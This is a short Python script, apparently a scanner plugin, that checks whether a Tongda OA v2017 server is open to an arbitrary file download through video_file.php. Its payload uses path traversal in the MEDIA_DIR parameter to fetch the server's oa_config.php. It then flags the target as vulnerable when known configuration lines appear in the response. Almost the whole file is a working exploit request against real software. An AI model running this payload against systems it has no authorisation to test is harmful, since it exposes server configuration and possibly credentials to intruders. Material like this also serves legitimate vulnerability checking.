import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '通达OA v2017 video_file.php 任意文件下载漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = '/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
    timeout = 3
    vurl = urllib.parse.urljoin(url, payload)
    try:
        res = requests.get(vurl, headers=headers,timeout=timeout, verify=False)
        if res.status_code == 200 and re.search('\$ROOT_PATH=getenv\("DOCUMENT_ROOT"\);', res.text) and re.search('\$ATTACH_PATH=\$ROOT_PATH\."attachment/";', res.text):
            relsult['vulnerable'] = True
            relsult['vurl'] = vurl
            return relsult
        else:
            return relsult
    except:
        return relsult